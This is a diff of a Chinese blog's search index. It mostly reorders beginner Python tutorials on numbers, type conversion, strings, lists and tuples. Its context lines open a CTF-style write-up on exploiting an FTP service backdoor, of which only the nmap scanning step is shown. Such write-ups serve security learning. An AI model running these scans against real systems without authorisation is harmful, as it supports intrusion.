@@ -1,122 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Python从入门到精通——1. 2 语法元素基础知识补充</title>
-    <url>/2024/09/26/e79cf7dbf05d/</url>
-    <content><![CDATA[<h1 id="前言声明"><a href="#前言声明" class="headerlink" title="前言声明"></a>前言声明</h1><p><em>本文主要是对对于第一节关于语法元素基础知识的补充内容。若发现有任何问题或者知识结构不完整的情况，请及时与我联系或者留下评论。</em></p>
-<h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><p>复数由实数部分和虚数部分构成，可以用<code>a + bj</code>,或者<code>complex(a,b)</code>表示， 复数的实部<code>a</code>和虚部<code>b</code>都是浮点型。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261419060.png"
-                      alt="image.png"
-                ></p>
-<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul>
-<li><strong>type(x)</strong> type() 函数如果你只有第一个参数则返回对象的类型，三个参数返回新的类型对象。(ps：一般也只用来查询数据类型，知道一个参数怎么用就够了)</li>
-<li><strong>int(x)</strong> 将x转换为一个整数。</li>
-<li><strong>float(x)</strong> 将x转换到一个浮点数。</li>
-<li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li>
-<li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261428151.png"
-                      alt="image.png"
-                ></li>
-</ul>
-<h3 id="函数补充"><a href="#函数补充" class="headerlink" title="函数补充"></a>函数补充</h3><table>
-<thead>
-<tr>
-<th align="left">函数</th>
-<th align="left">返回值 ( 描述 )</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">abs(x)</td>
-<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
-</tr>
-<tr>
-<td align="left"><strong>ceil(x)</strong></td>
-<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
-</tr>
-<tr>
-<td align="left">cmp(x, y)</td>
-<td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1。 <strong>Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换</strong>。</td>
-</tr>
-<tr>
-<td align="left"><strong>exp(x)</strong></td>
-<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
-</tr>
-<tr>
-<td align="left">fabs(x)</td>
-<td align="left">以浮点数形式返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
-</tr>
-<tr>
-<td align="left"><strong>floor(x)</strong></td>
-<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
-</tr>
-<tr>
-<td align="left"><strong>log(x)</strong></td>
-<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
-</tr>
-<tr>
-<td align="left">log10(x)</td>
-<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
-</tr>
-<tr>
-<td align="left"><strong>max(x1, x2,…)</strong></td>
-<td align="left">返回给定参数的最大值，参数可以为序列。</td>
-</tr>
-<tr>
-<td align="left"><strong>min(x1, x2,…)</strong></td>
-<td align="left">返回给定参数的最小值，参数可以为序列。</td>
-</tr>
-<tr>
-<td align="left">modf(x)</td>
-<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
-</tr>
-<tr>
-<td align="left"><strong>pow</strong>(x, y)</td>
-<td align="left">x**y 运算后的值。</td>
-</tr>
-<tr>
-<td align="left">[round(x ,n])</td>
-<td align="left">返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。<strong>其实准确的说是保留值将保留到离上一位更近的一端。</strong></td>
-</tr>
-<tr>
-<td align="left">sqrt(x)</td>
-<td align="left">返回数字x的平方根。</td>
-</tr>
-<tr>
-<td align="left">以上函数不一一演示，可以自行尝试练习，其实不用全部记住用法，只需要记住常用的就行，也就是上方加粗的函数，其他的遇到了可以上网查询用法。</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<h3 id="访问字符串中的值"><a href="#访问字符串中的值" class="headerlink" title="访问字符串中的值"></a>访问字符串中的值</h3><p>Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。<br>Python 访问子字符串，可以使用方括号 <code>[]</code> 来截取字符串，字符串的截取的语法格式如下：<br>也是利用索引，可以看成列表的索引。<strong>索引值以 0 为开始值，-1 为从末尾的开始位置。</strong><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261435724.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>图片来源：菜鸟教程</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261437830.png"
-                      alt="image.png"
-                ></p>
-<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>Python是一门很多内置函数的语言，并且函数的用法都很多样，有些你可能根本没遇到过，所以要学会<strong>上网查询</strong>，不会的可以留言。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>FTP服务后门利用</title>
     <url>/2024/09/11/602e2b077e4b/</url>
     <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
@@ -187,239 +71,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>FTP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python从入门到精通——2. 1 列表创建及相关操作</title>
-    <url>/2024/09/25/d56bb46a6c29/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>序列是Python中最基本的数据结构，序列中的每个值都有对应位置上的数据值，称之为索引。<br><em><strong>注意：索引的第一个是0</strong></em></p>
-<p><strong>在Python中，一共有6个内置类型，其中列表和元组是最常见的类型。</strong></p>
-<hr>
-<h1 id="1-列表"><a href="#1-列表" class="headerlink" title="1. 列表"></a>1. 列表</h1><h2 id="1-1-列表是什么及其创建"><a href="#1-1-列表是什么及其创建" class="headerlink" title="1.1 列表是什么及其创建"></a>1.1 列表是什么及其创建</h2><p><strong>列表</strong>是由一系列按特定顺序排列的元素的组成。包括你不仅可以创建包含字⺟表中所有字⺟、数字 0~9 或所有家庭成员姓名的列表，还可以将任何东西加⼊列表，其中的元素之间可以没有任何关系。列表通常包含多个元素，因此给列表指定⼀个表⽰复数的名称（如 letters、digits 或 names）是个不错的主意。<br>你可以把列表理解为C语言中的数组，但是Python的列表是一个更宏观的概念，它可以包括你想到的任何数据内容。<br>Python中，列表用中括号<code>[]</code>表示，用逗号分割其中的元素（ps：这里都是指英文半角下的符号，不能用中文符号，不然就会报错）。<br>举个例子：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251541693.png"
-                      alt="image.png"
-                ><br>可以看到：Python 将打印列表的内部表⽰，<strong>包括⽅括号。</strong></p>
-<hr>
-<h2 id="1-2-列表的相关操作"><a href="#1-2-列表的相关操作" class="headerlink" title="1.2 列表的相关操作"></a>1.2 列表的相关操作</h2><h3 id="1-2-1-列表索引访问"><a href="#1-2-1-列表索引访问" class="headerlink" title="1.2.1 列表索引访问"></a>1.2.1 列表索引访问</h3><h4 id="单个索引访问"><a href="#单个索引访问" class="headerlink" title="单个索引访问"></a>单个索引访问</h4><p>列表是一个有序集合，也就是说其中的元素并不是无序的，每个元素都有自己的位置，也就是[[#前言]]说的<code>索引</code>。我们要访问列表中的某一个位置，可以直接告诉Python这个位置的索引（我们说的第n个元素或位置，其索引要减去1，也就是索引为n-1）。要访问列表元素，可以指出列表的名称加上元素索引，索引要放在中括号内。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251542461.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>图片来源：菜鸟教程</p>
-</blockquote>
-<p>举个例子：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251543939.png"
-                      alt="image.png"
-                ></p>
-<p>这里有个特殊的方法，可以让你返回列表中的最后一个元素，无论列表的长度是多少，你都可以用索引<code>-1</code>来表示列表的最后一个元素，以此类推，索引<code>-2</code>用来访问倒数第二个元素……，如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251550715.png"
-                      alt="image.png"
-                ></p>
-<p><em>ps：访问的索引不能超过列表最后一个元素的索引，这样将会直接导致报错。只要列表不为空，索引<code>-1</code>来访问列表最后一个元素都有效</em></p>
-<h4 id="索引切片访问"><a href="#索引切片访问" class="headerlink" title="索引切片访问"></a>索引切片访问</h4><p>可以利用<code>[]</code>和<code>:</code>来确定一个索引范围来进行切片，就是对列表的某一段切出来进行打印。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251708866.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>图片来源：菜鸟教程</p>
-</blockquote>
-<p>注意：这里<code>:</code>右边的索引是不会被取到的，如下的<code>1:4</code>,是取不到索引为4的位置的元素。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658095.png"
-                      alt="image.png"
-                ></p>
-<p>同样，也可以用负数索引来表示倒数第几个元素<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658968.png"
-                      alt="image.png"
-                ></p>
-<p>有一种特殊情况，在<code>:</code>的左右两边是可以不加索引值的，意思是直接取到头，比如<code>2:</code>，表示从索引为2的（第三个）的元素取到最后一个（包括最后一个）。在前面切片范围的<code>:</code>之后还可以添加一个<code>:</code>，表示步长，所谓步长可以理解为等差数列的公差，就是隔一个步长取一个元素。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251704005.png"
-                      alt="image.png"
-                ></p>
-<p>你也可以用标准化输出来使用列表中的值，也就是第一章的<code>f</code>标准化输出<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251643872.png"
-                      alt="image.png"
-                ></p>
-<h3 id="1-2-2-列表的修改、添加、删除"><a href="#1-2-2-列表的修改、添加、删除" class="headerlink" title="1.2.2 列表的修改、添加、删除"></a>1.2.2 列表的修改、添加、删除</h3><p>Python的列表一般是动态的，也就是你可以对其中的某些元素进行一些操作来改变列表。比如当以后你自己做一个项目的适合，你自己做了一个游戏，游戏中有一些怪物，怪物是用一个列表存储的，当你消灭了一个怪物，这个怪物就会从列表中删除，相应的，当你通过一个关卡，列表中的怪物也会进行更新。</p>
-<h4 id="列表的修改"><a href="#列表的修改" class="headerlink" title="列表的修改"></a>列表的修改</h4><p>列表的修改十分简单，只是利用赋值运算符对某个索引位置的元素进行覆盖赋值。如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251710937.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的添加和删除（更新）"><a href="#列表的添加和删除（更新）" class="headerlink" title="列表的添加和删除（更新）"></a>列表的添加和删除（更新）</h4><p>列表的添加是一个很重要的操作，你可以用来更新你的列表数据，以达到你的目标要求。</p>
-<p>首先介绍一下队列：队列是一种先进先出（FIFO）的数据结构，我们可以使用列表来实现队列的基本功能。我们都知道在一个地方排队，是要从队伍末尾开始排的（不考虑没素质的人）。这样我们列表基本的添加和删除都是在列表的末尾进行操作的</p>
-<h5 id="append-函数"><a href="#append-函数" class="headerlink" title="append()函数"></a>append()函数</h5><p><strong>函数语法：<code>list.append(obj)</code></strong><br>首先来介绍列表的内置函数，可以把一个列表看成一个队列，这个append()函数也是满足队列的条件，是在列表的末尾进行添加。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251720596.png"
-                      alt="image.png"
-                ></p>
-<h5 id="pop-函数"><a href="#pop-函数" class="headerlink" title="pop()函数"></a>pop()函数</h5><p><strong>函数语法：<code>list.pop([index=-1])</code></strong><br><em>ps：pop()的默认参数就是最后一个索引，一般不自主选择（当然也可以自己选择索引）。这里需要注意，pop()函数是有返回值的，返回值就是你选择删除的数据，可以理解为一个抽象的栈，把数据从栈里面弹出来</em><br><code>pop()</code>函数是和<code>append()</code>函数相对的，这个函数是将列表的最后一个元素删除。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251724325.png"
-                      alt="image.png"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251841067.png"
-                      alt="image.png"
-                ></p>
-<h5 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h5><p><strong>函数语法：<code>list.insert(index, obj)</code></strong><br>    <em>ps：- index – 对象 obj 需要插入的索引位置     - obj – 要插入列表中的对象。</em><br>这个函数字面意思就是插入，你可以插入数据到列表的任意一个地方，你甚至可以插入一个列表，这就是列表的嵌套。当你插入一个数据后，后面的所有数据都会向后移一个位置，也就是索引加一<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251831764.png"
-                      alt="image.png"
-                ></p>
-<h5 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h5><p><strong>语法：<code>del list[index]</code></strong><br><code>del</code><em>不是</em><code>python3</code> 中的<strong>内置函数</strong>，<code>del</code>只是一个关键字，就跟<code>import</code>和<code>return</code>一样<br>del也是可以删除列表中任意位置的数据，你只需要知道数据的索引即可<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251838748.png"
-                      alt="image.png"
-                ></p>
-<h5 id="比较del和pop"><a href="#比较del和pop" class="headerlink" title="比较del和pop()"></a>比较del和pop()</h5><p>当你想要删除数据时该如何选择呢？这个其实很简单，当你想要直接删除数据并且不想再使用这个数据时，你就可以用del语句，直接将数据清楚；当然你也可以用pop()函数，但是不用一个变量来保存这个删除的数据，也就相当于直接删除。如果你想要将数据从列表中取出来，并且要将这个数据用以其他操作，那么你就只能用pop()函数。</p>
-<h5 id="remove-函数"><a href="#remove-函数" class="headerlink" title="remove()函数"></a>remove()函数</h5><p>有时候，你不知道要从列表中删除的值在哪个位置。如果只知道要删除的元素的值，可使⽤ <code>remove()</code> ⽅法。<br><em>ps：<code>remove()</code>函数只会删除第一个满足条件的数据，也就是当找到了第一个需要删除的元素，他就停止寻找了。如果想要删除更多或者全部相同元素，就需要使用循环，这将在后面循环结构的一章进行讲解</em><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251857448.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5><p><strong>函数语法：<code>list.sort(cmp=None, key=None, reverse=False)</code></strong></p>
-<ul>
-<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，reverse &#x3D; True 降序， reverse &#x3D; False 升序（默认）。</li>
-</ul>
-<p>Python有一个内置函数，可以对列表轻松的进行排序。值得注意的是，<code>sort()</code>函数不止对数字进行排序，也可以对字母进行排序。如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251911202.png"
-                      alt="image.png"
-                ></p>
-<p>当然也可以对列表进行逆序，只需要加上参数<code>reverse = True</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251923030.png"
-                      alt="image.png"
-                ></p>
-<h5 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h5><p><code>sort()</code>函数使用之后，列表的顺序就会被永久改变，如果想要进行临时排序，就可以使用<code>sorted()</code>函数<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251931129.png"
-                      alt="image.png"
-                ><br>在调⽤ <code>sorted()</code> 函数后，列表元素的排列顺序并没有变<br>如果要按与字⺟顺序相反的顺序显⽰列表，也可向 <code>sorted()</code> 函数 传递参数 <code>reverse=True</code></p>
-<p><em>ps：在并⾮所有的值都是全小写的时，按字⺟顺序排列列表要复杂⼀些。在确定排列顺序时，有多种解读⼤写字⺟的⽅式，此时要指定准确的排列顺序，可能会比这⾥所做的更加复杂。然而，大多数排序方式是以本节介绍的知识为基础的。</em></p>
-<h5 id="reverse-函数"><a href="#reverse-函数" class="headerlink" title="reverse()函数"></a>reverse()函数</h5><p>要反转列表元素的排列顺序，可使⽤ reverse() ⽅法。这里是将原列表的顺序进行反转，而不是排序后反转<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251934680.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的其他操作"><a href="#列表的其他操作" class="headerlink" title="列表的其他操作"></a>列表的其他操作</h4><h5 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h5><p>这个函数是用来统计列表中某个数据出现的次数的<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946234.png"
-                      alt="image.png"
-                ></p>
-<h5 id="extend-函数"><a href="#extend-函数" class="headerlink" title="extend()函数"></a>extend()函数</h5><p>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946805.png"
-                      alt="image.png"
-                ></p>
-<h5 id="index-函数"><a href="#index-函数" class="headerlink" title="index()函数"></a>index()函数</h5><p>从列表中找出某个值第一个匹配项的索引位置<br><em>ps：如果在列表中有重复元素，只会索引到目标数据第一次出现的索引位置</em><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251947793.png"
-                      alt="image.png"
-                ></p>
-<h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy()函数"></a>copy()函数</h5><p>将一个列表进行复制并返回该复制的列表<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251948401.png"
-                      alt="image.png"
-                ></p>
-<h5 id="clear-函数"><a href="#clear-函数" class="headerlink" title="clear()函数"></a>clear()函数</h5><p>将列表清空<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251949806.png"
-                      alt="image.png"
-                ></p>
-<h3 id="1-2-3-Python列表脚本操作符"><a href="#1-2-3-Python列表脚本操作符" class="headerlink" title="1.2.3 Python列表脚本操作符"></a>1.2.3 Python列表脚本操作符</h3><p>列表对 <code>+</code> 和 <code>*</code> 的操作符与字符串相似。<code>+</code> 号用于组合列表，<code>*</code> 号用于重复列表。</p>
-<table>
-<thead>
-<tr>
-<th align="left">Python 表达式</th>
-<th align="left">结果</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">len([1, 2, 3])</td>
-<td align="left">3</td>
-<td align="left">列表的长度</td>
-</tr>
-<tr>
-<td align="left">[1, 2, 3] + [4, 5, 6]</td>
-<td align="left">[1, 2, 3, 4, 5, 6]</td>
-<td align="left">组合</td>
-</tr>
-<tr>
-<td align="left">[‘Hi!’] * 4</td>
-<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
-<td align="left">重复</td>
-</tr>
-<tr>
-<td align="left">3 in [1, 2, 3]</td>
-<td align="left">True</td>
-<td align="left">元素是否存在于列表中</td>
-</tr>
-<tr>
-<td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td>
-<td align="left">1 2 3</td>
-<td align="left">迭代</td>
-</tr>
-<tr>
-<td align="left">max([1, 2, 3])</td>
-<td align="left">3</td>
-<td align="left">列表中的最大值</td>
-</tr>
-<tr>
-<td align="left">min([1, 2, 3])</td>
-<td align="left">1</td>
-<td align="left">列表中的最小值</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>[!NOTE] 本文用到的代码集合<br><a class="link"   href="https://github.com/dunm1e/blog_code/blob/main/Python_course_code/2.1.ipynb" >blog_code&#x2F;Python_course_code&#x2F;2.1.ipynb at main · dunm1e&#x2F;blog_code (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>python</category>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
@@ -786,29 +437,99 @@
       </tags>
   </entry>
   <entry>
-    <title>Python从入门到精通——2. 2 元组和字典的创建及相关操作</title>
-    <url>/2024/09/27/7185ada32ee0/</url>
-    <content><![CDATA[<h1 id="列表与元组的比较"><a href="#列表与元组的比较" class="headerlink" title="列表与元组的比较"></a>列表与元组的比较</h1><p>列表适合存储在程序中且在运行期间会进行变化的数据集，因为列表是可以变化的。但是元组不同，元组被赋值后就确定了，在后面的运行过程中是无法被更改的。所以列表和元组是有不同的应用场景的，列表一般应用于比如游戏内容或者网站用户等场景。而元组一般应用于一个游戏或者网站固定属性和内容的场景。</p>
-<h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><h2 id="元组的定义"><a href="#元组的定义" class="headerlink" title="元组的定义"></a>元组的定义</h2><p>元组是使用圆括号（小括号）来进行引用标识（其实这个说法有问题，具体原因后面会分析）。其他的方式和列表大差不差，括号中添加元素后，利用逗号隔开，一个元组内部也可以有多种类型的数据。<em>（ps：这里的符号也是英文半角下的符号，中文符号无法编译会报错）</em>。</p>
-<h2 id="元组的创建"><a href="#元组的创建" class="headerlink" title="元组的创建"></a>元组的创建</h2><p>创建一个空元组：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">tup = ()</span><br></pre></td></tr></table></figure></div>
-<p><img  
+    <title>Python从入门到精通——1. 2 语法元素基础知识补充</title>
+    <url>/2024/09/26/e79cf7dbf05d/</url>
+    <content><![CDATA[<h1 id="前言声明"><a href="#前言声明" class="headerlink" title="前言声明"></a>前言声明</h1><p><em>本文主要是对对于第一节关于语法元素基础知识的补充内容。若发现有任何问题或者知识结构不完整的情况，请及时与我联系或者留下评论。</em></p>
+<h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><p>复数由实数部分和虚数部分构成，可以用<code>a + bj</code>,或者<code>complex(a,b)</code>表示， 复数的实部<code>a</code>和虚部<code>b</code>都是浮点型。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271748724.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261419060.png"
                       alt="image.png"
                 ></p>
-<p><em><strong>注意：若创建的元组只含有一个元素时，需要在元素后面加上逗号<code>,</code>，否则会认为你创建的不是元组，而只是一个int类型的整数，括号则被当成一个运算符使用。</strong></em><br><strong>所以更加严格的说法，元组是由逗号标识的，圆括号只是让元组更整洁清晰，并且有一个更明显的特征罢了。</strong></p>
-<p><img  
+<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul>
+<li><strong>type(x)</strong> type() 函数如果你只有第一个参数则返回对象的类型，三个参数返回新的类型对象。(ps：一般也只用来查询数据类型，知道一个参数怎么用就够了)</li>
+<li><strong>int(x)</strong> 将x转换为一个整数。</li>
+<li><strong>float(x)</strong> 将x转换到一个浮点数。</li>
+<li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li>
+<li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271751810.png"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409261428151.png"
                       alt="image.png"
-                >			</p>
-<p>元组和列表类似，也是通过索引访问元素，并且索引也是<strong>从0开始</strong>。可以进行<strong>截取</strong>和<strong>组合</strong>操作<br><img  
+                ></li>
+</ul>
+<h3 id="函数补充"><a href="#函数补充" class="headerlink" title="函数补充"></a>函数补充</h3><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">返回值 ( 描述 )</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">abs(x)</td>
+<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
+</tr>
+<tr>
+<td align="left"><strong>ceil(x)</strong></td>
+<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
+</tr>
+<tr>
+<td align="left">cmp(x, y)</td>
+<td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1。 <strong>Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换</strong>。</td>
+</tr>
+<tr>
+<td align="left"><strong>exp(x)</strong></td>
+<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
+</tr>
+<tr>
+<td align="left">fabs(x)</td>
+<td align="left">以浮点数形式返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
+</tr>
+<tr>
+<td align="left"><strong>floor(x)</strong></td>
+<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
+</tr>
+<tr>
+<td align="left"><strong>log(x)</strong></td>
+<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
+</tr>
+<tr>
+<td align="left">log10(x)</td>
+<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
+</tr>
+<tr>
+<td align="left"><strong>max(x1, x2,…)</strong></td>
+<td align="left">返回给定参数的最大值，参数可以为序列。</td>
+</tr>
+<tr>
+<td align="left"><strong>min(x1, x2,…)</strong></td>
+<td align="left">返回给定参数的最小值，参数可以为序列。</td>
+</tr>
+<tr>
+<td align="left">modf(x)</td>
+<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
+</tr>
+<tr>
+<td align="left"><strong>pow</strong>(x, y)</td>
+<td align="left">x**y 运算后的值。</td>
+</tr>
+<tr>
+<td align="left">[round(x ,n])</td>
+<td align="left">返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。<strong>其实准确的说是保留值将保留到离上一位更近的一端。</strong></td>
+</tr>
+<tr>
+<td align="left">sqrt(x)</td>
+<td align="left">返回数字x的平方根。</td>
+</tr>
+<tr>
+<td align="left">以上函数不一一演示，可以自行尝试练习，其实不用全部记住用法，只需要记住常用的就行，也就是上方加粗的函数，其他的遇到了可以上网查询用法。</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h3 id="访问字符串中的值"><a href="#访问字符串中的值" class="headerlink" title="访问字符串中的值"></a>访问字符串中的值</h3><p>Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。<br>Python 访问子字符串，可以使用方括号 <code>[]</code> 来截取字符串，字符串的截取的语法格式如下：<br>也是利用索引，可以看成列表的索引。<strong>索引值以 0 为开始值，-1 为从末尾的开始位置。</strong><br><img  
                      lazyload
                      src="/images/loading.svg"
